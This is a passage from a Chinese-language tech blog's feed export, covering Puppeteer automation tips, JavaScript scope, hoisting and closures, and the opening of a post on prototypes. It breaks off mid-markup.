class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const puppeteer = require(&apos;puppeteer&apos;);</span><br><span class="line">const devices = require(&apos;puppeteer/DeviceDescriptors&apos;)</span><br><span class="line"></span><br><span class="line">const page = await browser.newPage();</span><br><span class="line">await page.emulate(devices[&apos;iPhone X&apos;])</span><br><span class="line">await page.goto(&apos;https://www.baidu.com&apos;&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>page.waitFor</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page.waitFor(selectorOrFunctionOrTimeout[, options[, ...args]])</span><br></pre></td></tr></table></figure><p>等待指定dom节点内容渲染完成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let selector = &apos;.price&apos;;</span><br><span class="line">await page.waitFor(selector =&gt;&#123;</span><br><span class="line">    return (document.querySelector(selector)||&#123;&#125;).innerText;</span><br><span class="line">&#125;, &#123;&#125;, selector);</span><br></pre></td></tr></table></figure><blockquote><p>page.goto(<code>url</code>[, <code>options</code>])</p></blockquote><ul><li>url <code>&lt;string&gt;</code> : 指定跳转地址</li><li>options <code>&lt;Object&gt;</code>:<ul><li><code>networkidle0</code>: 500毫秒内没有任何一个网络请求</li><li><code>networkidle2</code>:  500毫秒内没有超过任何二个网络请求</li><li><code>domcontentloaded</code>: dom装载完成</li></ul></li></ul><h2 id="页面环境执行脚本"><a href="#页面环境执行脚本" class="headerlink" title="页面环境执行脚本"></a>页面环境执行脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">await page.evaluate(() =&gt; &#123;</span><br><span class="line">    let name = window.name;</span><br><span class="line">    return name;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>page.evaluate(pageFunction[, …args])</p></blockquote><ul><li><code>pageFunction</code>: <code>&lt;Function&gt;</code> 执行脚本，函数在浏览器环境执行，拥有<code>window</code>、<code>document</code>访问权限</li><li><code>...args</code>: <code>&lt;...Serializable|JSHandle&gt;</code>,传入参数，<code>pageFunction</code>无法访问函数外部变量，因为<code>pageFunction</code>内容将会直接当做脚本注入页面</li></ul><p>由于<code>pageFunction</code>函数会直接被注入到页面中，所以无法获取函数外部作用域，只能讲外部参数通过<code>args</code>传入，不能直接将<code>Function</code>传入，只能将函数通过<code>toString</code>后，在通过<code>eval</code>来执行<code>string</code>化后的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let detect = () =&gt; &#123;</span><br><span class="line">    // ... do some thing</span><br><span class="line">    return &apos;res&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"> const html = await page.evaluate((fn) =&gt; &#123;</span><br><span class="line">        let res = eval(fn)();</span><br><span class="line">        return res;</span><br><span class="line">&#125;, detect.toString());</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><p>页面注入脚本，监听事件失效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">let renderReady = () =&gt; &#123;</span><br><span class="line">      return new Promise((resolve) =&gt; &#123;</span><br><span class="line">          document.onreadystatechange = () =&gt; &#123;</span><br><span class="line">              if (document.readyState === &apos;complete&apos;) &#123;</span><br><span class="line">                  resolve();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;;</span><br><span class="line">      &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(async () =&gt; &#123;</span><br><span class="line">    await renderReady()</span><br><span class="line">    console.log(&apos;complete&apos;) // 永远也不会走到这一块来，进入到renderReady后就失效了</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h2 id="jest-puppeteer"><a href="#jest-puppeteer" class="headerlink" title="jest-puppeteer"></a>jest-puppeteer</h2><p><a href="https://jestjs.io/docs/zh-Hans/puppeteer" target="_blank" rel="noopener">官方文档</a></p><p>使用puppeteer与jest搭配测试：</p><ul><li>依赖安装<code>npm install --save-dev jest-puppeteer puppeteer jest</code></li><li><code>package.json</code>添加<code>&quot;jest&quot;: {&quot;preset&quot;: &quot;jest-puppeteer&quot;}</code>依赖</li></ul><h3 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h3><p>在使用TypeScript中使用<code>puppeteer</code>测试需要注意一下几点：</p><blockquote><p>由于TypeScript需要进行类型检测所以需要在全局环境注入变量</p></blockquote><p>依赖安装：</p><p><code>@types/puppeteer</code>, <code>@types/jest-environment-puppeteer</code></p><p>配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    jest: &#123;</span><br><span class="line">        &quot;globalSetup&quot;: &quot;jest-environment-puppeteer/setup&quot;,</span><br><span class="line">        &quot;globalTeardown&quot;: &quot;jest-environment-puppeteer/teardown&quot;,</span><br><span class="line">        &quot;testEnvironment&quot;: &quot;jest-environment-puppeteer&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>指定输出版本</p></blockquote><p>若输出目标为<code>&quot;target&quot;: &quot;es5&quot;</code>，则会报各种依赖无法查找错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReferenceError: __awaiter is not defined</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// tsconfig.json,文件配置</span><br><span class="line">&#123;</span><br><span class="line">  &quot;compilerOptions&quot;: &#123;</span><br><span class="line">    &quot;target&quot;: &quot;es2017&quot;,</span><br><span class="line">    // ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;待补充….&lt;/p&gt;
&lt;h2 id=&quot;centOs7-0无法运行问题&quot;&gt;&lt;a href=&quot;#centOs7-0无法运行问题&quot; class=&quot;h
      
    
    </summary>
    
      <category term="node" scheme="http://zhoushaw.github.io/categories/node/"/>
    
    
      <category term="node" scheme="http://zhoushaw.github.io/tags/node/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript系列之作用域与闭包</title>
    <link href="http://zhoushaw.github.io/2019/04/21/learning/font-end/js/JavaScript-closure/"/>
    <id>http://zhoushaw.github.io/2019/04/21/learning/font-end/js/JavaScript-closure/</id>
    <published>2019-04-21T01:39:35.000Z</published>
    <updated>2019-04-27T13:21:01.129Z</updated>
    
    <content type="html"><![CDATA[<h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>在进入作用域的讨论之前先明什么是作用域，通过一句话简单描述就是：<strong>一组明确定义的规则，它定义如何在某些位置存储变量，以及如何在稍后找到这些变量</strong></p><h3 id="词法作用域"><a href="#词法作用域" class="headerlink" title="词法作用域"></a>词法作用域</h3><p>作用域的工作方式有两种占统治地位的模型。其中的第一种是最最常见，在绝大多数的编程语言中被使用的。它称为 <strong>词法作用域</strong>，我们将深入检视它。另一种仍然被一些语言（比如 Bash 脚本，Perl 中的一些模式，等等）使用的模型，称为 <strong>动态作用域</strong>。</p><p>JavaScript采用的是<strong>词法作用域</strong>，这意味着<strong>作用域</strong>是编写时确定的，而不是运行时确定的，当然也可以通过<strong>欺骗</strong>来达到动态作用域，例如使用：<code>eval</code>、<code>with</code>等关键词</p><blockquote><p>词法分析</p></blockquote><p>JavaScript的代码运行，并不是像你想象的<strong>逐行编译</strong>，而是在进行编译前会进行<strong>词法分析</strong>。也就形成了我们所说的<strong>词法作用域</strong>。</p><p>可以通过下面的🌰来看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">    console.log(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function bar() &#123;</span><br><span class="line">    var value = 2;</span><br><span class="line">    foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line">// 结果是 ???</span><br></pre></td></tr></table></figure><p>大多数人看到这个🌰第一个反应结果是：输出<code>2</code>，但是需要注意的是foo的作用域并不存在与<code>bar函数</code>中,因为JavaScript的<code>作用域</code>是词法作用域，所以并不能获取到bar函数中 <code>var value = 2</code>的声明。</p><p>下面我们来简单描述一下这段代码的执行过程：</p><ul><li>在全局环境下声明了<code>value变量</code>、<code>foo函数</code>、<code>bar函数</code></li><li>执行<code>bar函数</code>，</li><li>在函数<code>bar</code>内部声明了<code>value变量</code>并赋值为2</li><li>执行，<code>foo函数</code></li><li>在函数内寻找<code>value变量</code>声明，未找到,向上一层作用域继续寻找</li><li>在顶层作用域<code>window</code>下寻找到了<code>value</code>变量，若直到顶层作用域任未找到则报错</li><li>输出结果<code>1</code></li></ul><h3 id="动态作用域"><a href="#动态作用域" class="headerlink" title="动态作用域"></a>动态作用域</h3><p>上面已经描述了词法作用域的工作方式，这里我们来稍微讲讲与<strong>词法作用域</strong>完全对立的<strong>动态作用域</strong></p><p>我们这里就以bash为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">value=1</span><br><span class="line">function foo () &#123;</span><br><span class="line">    echo $value;</span><br><span class="line">&#125;</span><br><span class="line">function bar () &#123;</span><br><span class="line">    local value=2;</span><br><span class="line">    foo;</span><br><span class="line">&#125;</span><br><span class="line">bar // 2</span><br></pre></td></tr></table></figure><p>我们将上面代码保存为<code>scope.bash</code>的文件，通过执行<code>bash scope.bash</code>,最终输出<code>1</code></p><h3 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h3><p>在代码执行前，引擎会在执行前编译它。编译过程的一部分就是找到<strong>所有的声明</strong>，并将它们<strong>关联在合适的作用域上</strong></p><p>例如这段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = 2;</span><br><span class="line"></span><br><span class="line">var a;</span><br><span class="line"></span><br><span class="line">console.log( a );</span><br></pre></td></tr></table></figure><p>当你看到 <code>var a = 2;</code> 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：<code>var a;</code> 和 <code>a = 2;</code></p><ul><li>第一个语句，声明，是在编译阶段被处理的。</li><li>第二个语句，赋值，为了执行阶段而留在 原处。</li></ul><p>于是可以认为代码被处理成这样了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line">a = 2;</span><br><span class="line"></span><br><span class="line">console.log( a );</span><br></pre></td></tr></table></figure><p>关于这种处理的一个有些隐喻的考虑方式是，变量和函数声明被从它们在代码流中出现的位置<strong>“移动”到代码的顶端</strong>。这就产生了<strong>“提升”</strong>这个名字</p><p>需要注意的是：提升是 <strong>以作用域为单位的</strong></p><h4 id="函数优先"><a href="#函数优先" class="headerlink" title="函数优先"></a>函数优先</h4><p>函数声明和变量声明都会被提升。但一个微妙的细节（可以 在拥有多个“重复的”声明的代码中出现）是，<strong>函数会首先被提升</strong>，<strong>然后才是变量</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">foo(); // 1</span><br><span class="line"></span><br><span class="line">var foo;</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">console.log( 1 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo = function() &#123;</span><br><span class="line">console.log( 2 );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>将会被转变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( 1 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); // 1</span><br><span class="line"></span><br><span class="line">foo = function() &#123;</span><br><span class="line">console.log( 2 );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意那个 <code>var foo</code> 是一个重复（因此被无视）的声明，即便它出现在 <code>function foo()...</code> 声明之前，因为函数声明是在普通变量之前被提升的。</p><p>虽然<strong>多个/重复的 var</strong>声明实质上是被忽略的，但是后续的函数声明<strong>确实会覆盖前一个</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    console.log(&apos;a&apos;);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br><span class="line">function foo () &#123;</span><br><span class="line">    console.log(&apos;b&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上转变成了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function foo () &#123;</span><br><span class="line">    console.log(&apos;b&apos;);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包对于大多数熟练的JavaScript也算是一个模糊不清的概念，什么是闭包呢，闭包能给我们带来什么好处和坏处？</p><p>简单来说可以用一句话概括闭包的特性与作用：<strong>闭包就是函数能够记住并访问它的词法作用域，即使这个函数在它的词法作用域外执行</strong></p><blockquote><p>让我们跳进代码来说明这个定义：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>上面的代码段被认为是函数 bar() 在函数 foo() 的作用域上有一个 闭包.换一种略有不同的说法是，bar() 闭住了 foo() 的作用域。为什么？因为 bar() 嵌套地出现在 foo() 内部。就这么简单。</p><p>根据文章上面的<code>作用域</code>我们知道，函数的作用域是<strong>编写时定义</strong>的而不是运行时决定的，所以我们通过函数内部返回函数时，返回出来的函数的作用域链的<strong>起始位置</strong>依然是那个函数内部。由于在函数外部对函数内部值存在引用的关系，<strong>垃圾回收机制</strong>并不会将变量回收而是会一直在函数内部引用。</p><h3 id="闭包的特性"><a href="#闭包的特性" class="headerlink" title="闭包的特性"></a>闭包的特性</h3><p>根据闭包的定义我们能很容易记住其两大特点：</p><p>1、能够记住并访问它的词法作用域<br>2、即使在它的作用域外执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baz = foo();</span><br><span class="line"></span><br><span class="line">baz(); <span class="comment">// 2 -- 哇噢，看到闭包了，伙计。</span></span><br></pre></td></tr></table></figure><ul><li><code>bar()</code> 被执行了，必然的。但是在这个例子中，它是在它被声明的词法作用域 外部 被执行的。</li><li><code>foo()</code> 被执行之后，一般说来我们会期望 <code>foo()</code> 的整个内部作用域都将消失，因为我们知道 引擎 启用了 垃圾回收器 在内存不再被使用时来回收它们。因为很显然 <code>foo()</code> 的内容不再被使用了，所以看起来它们很自然地应该被认为是 消失了。</li><li>但是闭包的“魔法”不会让这发生。内部的作用域实际上 依然 “在使用”，因此将不会消失。谁在使用它？函数 <code>bar()</code> 本身。</li><li>有赖于它被声明的位置，<code>bar()</code> 拥有一个词法作用域闭包覆盖着 <code>foo()</code> 的内部作用域，闭包为了能使 <code>bar()</code> 在以后任意的时刻可以引用这个作用域而保持它的存在。</li><li><code>bar()</code> 依然拥有对那个作用域的引用，而这个引用称为闭包。</li></ul><h3 id="闭包使用场景"><a href="#闭包使用场景" class="headerlink" title="闭包使用场景"></a>闭包使用场景</h3><h4 id="无处不在的闭包"><a href="#无处不在的闭包" class="headerlink" title="无处不在的闭包"></a>无处不在的闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( message );</span><br><span class="line">&#125;, <span class="number">1000</span> );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait( <span class="string">"Hello, closure!"</span> );</span><br></pre></td></tr></table></figure><ul><li>我们拿来一个内部函数（名为 timer）将它传递给 setTimeout(..)。但是 timer 拥有覆盖 wait(..) 的作用域的闭包，实际上保持并使用着对变量 message 的引用。</li><li>在我们执行 wait(..) 一千毫秒之后，要不是内部函数 timer 依然拥有覆盖着 wait() 内部作用域的闭包，它早就会消失了。</li><li>在 引擎 的内脏深处，内建的工具 setTimeout(..) 拥有一些参数的引用，可能称为 fn 或者 func 或者其他诸如此类的东西。引擎 去调用这个函数，它调用我们的内部 timer 函数，而词法作用域依然完好无损。</li></ul><h4 id="循环-闭包"><a href="#循环-闭包" class="headerlink" title="循环 + 闭包"></a>循环 + 闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( i );</span><br><span class="line">&#125;, i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的精神是，我们一般将 期待 它的行为是分别打印数字“1”，“2”，……“5”，一次一个，一秒一个<br>实际上，如果你运行这段代码，你会得到“6”被打印5次，一秒一个。</p><p class="tip">我们试图 暗示 在迭代期间，循环的每次迭代都“捕捉”一份对 i 的拷贝。但是，虽然所有这5个函数在每次循环迭代中分离地定义，由于作用域的工作方式，它们 都闭包在同一个共享的全局作用域上，而它事实上只有一个 i</p><p>如何解决这个问题呢，定义一个新的作用域，在每次迭代时持有值 i 的一个拷贝。在新的匿名函数内部定义了一个新的局部作用域，i设置为了每次遍历时的值，这样便不会继续往上遍历了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">j</span>)</span>&#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( j );</span><br><span class="line">&#125;, j*<span class="number">1000</span> );</span><br><span class="line">&#125;)( i );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;作用域&quot;&gt;&lt;a href=&quot;#作用域&quot; class=&quot;headerlink&quot; title=&quot;作用域&quot;&gt;&lt;/a&gt;作用域&lt;/h2&gt;&lt;p&gt;在进入作用域的讨论之前先明什么是作用域，通过一句话简单描述就是：&lt;strong&gt;一组明确定义的规则，它定义如何在某些位置存储变量，以
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript系列之原型与原型链</title>
    <link href="http://zhoushaw.github.io/2019/04/20/learning/font-end/js/JavaScript-prototype/"/>
    <id>http://zhoushaw.github.io/2019/04/20/learning/font-end/js/JavaScript-prototype/</id>
    <published>2019-04-20T02:47:35.000Z</published>
    <updated>2019-04-27T13:21:01.129Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在JavaScript语言中实际上并不存在“类”，那么它是如何实现<strong>继承</strong>、<strong>多态</strong>、<strong>实例化</strong>等特性呢。它采用了与类不同的另一种技术，将其称之为<strong>原型</strong>，并通过<strong>原型链</strong>来实现<strong>继承</strong>、<strong>多态</strong>等特性。</p><p>但是需要注意的是JavaScript的<strong>继承</strong>,与Java的继承实际上有很大的区别，在Java语言中，<strong>继承</strong>是一个<strong>拷贝过程</strong>在物理地址上发生了拷贝，而JavaScript语言是通过<strong>原型链</strong>将其”链接”在一起，没有发生实际的拷贝。</p><div><a id="more"></a></div><h2 id="构造函数创建对象"><a href="#构造函数创建对象" class="headerlink" title="构造函数创建对象"></a>构造函数创建对象</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">var person = new Person();</span><br><span class="line">person.name = &apos;Kevin&apos;;</span><br><span class="line">console.log(person.name) // Kevin</span><br></pre></td></tr></table></figure><p>在这个例子中，Person 就是一个构造函数，我们使用 new 创建了一个实例对象 person。</p><h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><h3 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h3><p>什么是原型呢？可以这样理解：每一个JavaScript对象(null除外)在创建的时候就会与之<strong>关联</strong>另一个对象，这个对象就是我们所说的<strong>原型</strong>，每一个对象都会从<strong>原型</strong>“<strong>继承</strong>“属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// 虽然写在注释里，但是你要注意：</span><br><span class="line">// prototype是函数才会有的属性</span><br><span class="line">Person.prototype.name = &apos;Kevin&apos;;</span><br><span class="line">var person1 = new Person();</span><br><span class="line">var person2 = new Person();</span><br><span class="line">console.log(person1.name) // Kevin</span><br><span class="line">console.log(person2.name) // Kevin</span><br></pre></td></tr></table></figure><p>这个函数的 prototype 属性到底指向的是什么呢？是这个函数的原型吗？</p><blockquote><p>上面例子中的解释：</p></blockquote><ul><li><code>Person</code>为构造函数</li><li><code>person1</code>、<code>person2</code>为<code>Person</code>的实例</li><li>构造函数的<code>prototype</code>属性指向，调用该构造函数而创建的实例的<strong>原型</strong></li><li><code>Person.prototype</code>为<code>person1</code>的<strong>原型</strong></li><li><code>person1</code>、<code>person2</code>继承了原型中的<code>name</code>属性</li></ul><p>用一张图解释<strong>构造函数</strong>与<strong>实例原型</strong>的关系</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_21bijk293k7244lgcie0j4fgbe5g2_1058x578.png" alt=""></p><h3 id="proto"><a href="#proto" class="headerlink" title="proto"></a><strong>proto</strong></h3><p>在上面的<strong>prototype</strong>中我们详细描述了<strong>构造函数</strong>如何与实例原型联系起来，那<strong>实例</strong>如何与<strong>实例原型</strong>之间如何联系呢？</p><p>在标准浏览器中构造函数的<strong>实例</strong>都拥有一个<code>__proto__</code>属性，通过这个<strong>实例</strong>上的<strong>属性</strong>可以找到这个实例的原型</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_1235011ggh2af3b01hj7941010l4l_990x668.png" alt=""></p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>每个原型都有一个 <strong>constructor</strong> 属性指向关联的构造函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">console.log(Person === Person.prototype.constructor); // true</span><br></pre></td></tr></table></figure><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_1345h0c13a027556c48j45lj2ib2e_1104x556.png" alt=""></p><p>综上我们已经得出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var person = new Person();</span><br><span class="line"></span><br><span class="line">console.log(person.__proto__ == Person.prototype) // true</span><br><span class="line">console.log(Person.prototype.constructor == Person) // true</span><br><span class="line">// 顺便学习一个ES5的方法,可以获得对象的原型</span><br><span class="line">console.log(Object.getPrototypeOf(person) === Person.prototype) // true</span><br></pre></td></tr></table></figure><p>并且我们得出了：<code>构造函数</code>、<code>原型</code>、<code>实例</code>之间的关系</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_7b4h6c755ckcg3ig1719c71jjdlcc_1244x990.png" alt=""></p><h2 id="实例与原型"><a href="#实例与原型" class="headerlink" 